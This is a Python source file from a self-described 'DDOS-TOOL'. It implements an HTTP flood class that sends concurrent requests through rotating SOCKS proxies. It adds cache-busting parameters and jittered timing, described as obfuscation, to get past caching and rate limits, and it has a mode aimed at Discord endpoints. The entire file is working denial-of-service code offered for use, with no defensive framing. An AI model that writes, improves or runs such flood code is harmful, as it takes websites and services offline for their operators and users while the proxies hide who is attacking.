"""
DDOS-TOOL

Author / Developer / Admin / Owner: Aashu
GitHub:  @outwiles
Telegram: @outwiles
Email:   outwiles@proton.me

License: MIT
"""

import asyncio
import random
import time
from urllib.parse import urlparse, urlencode, urlunparse, parse_qsl

import aiohttp
from aiohttp_socks import ProxyConnector

from ..utils.headers import build_headers, cache_buster


class HTTPFlood:
    def __init__(self, cfg: dict, pool, logger):
        self.cfg = cfg
        self.pool = pool
        self.logger = logger
        self.sent = 0
        self.failed = 0
        self._stop = False
        self._lock = asyncio.Lock()

    def _build_url(self, base: str, bust: bool) -> str:
        if not bust:
            return base
        parsed = urlparse(base)
        q = parse_qsl(parsed.query)
        q.append(("_", cache_buster()))
        return urlunparse(parsed._replace(query=urlencode(q)))

    async def _one(self, target: dict, sem: asyncio.Semaphore):
        async with sem:
            if self._stop:
                return
            proxy = await self.pool.acquire()
            if proxy is None:
                self.logger.warning("proxy pool empty")
                self._stop = True
                return

            url = self._build_url(target["url"], self.cfg["attack"]["cache_buster"])
            headers = build_headers(target.get("type", "http"))
            timeout = aiohttp.ClientTimeout(total=self.cfg["attack"]["timeout_sec"])
            connector = ProxyConnector.from_url(proxy.url, rdns=True)

            start = time.perf_counter()
            try:
                async with aiohttp.ClientSession(connector=connector, timeout=timeout) as s:
                    if target.get("type") == "discord":
                        async with s.post(url, headers=headers, data=b"{}", allow_redirects=False) as r:
                            await r.read()
                    else:
                        async with s.get(url, headers=headers, allow_redirects=False) as r:
                            await r.read()

                latency = (time.perf_counter() - start) * 1000
                await self.pool.report(proxy, ok=True, latency_ms=latency)
                async with self._lock:
                    self.sent += 1
            except Exception:
                await self.pool.report(proxy, ok=False)
                async with self._lock:
                    self.failed += 1

            jmin, jmax = self.cfg["obfuscation"]["jitter_ms"]
            await asyncio.sleep(random.uniform(jmin, jmax) / 1000.0)

    async def run(self, target: dict) -> dict:
        sem = asyncio.Semaphore(self.cfg["attack"]["concurrency"])
        deadline = time.time() + self.cfg["attack"]["duration_sec"]

        async def worker():
            while time.time() < deadline and not self._stop:
                await self._one(target, sem)

        workers = [asyncio.create_task(worker()) for _ in range(self.cfg["attack"]["concurrency"])]
        try:
            await asyncio.gather(*workers)
        except asyncio.CancelledError:
            self._stop = True
            for w in workers:
                w.cancel()

        return {"sent": self.sent, "failed": self.failed}
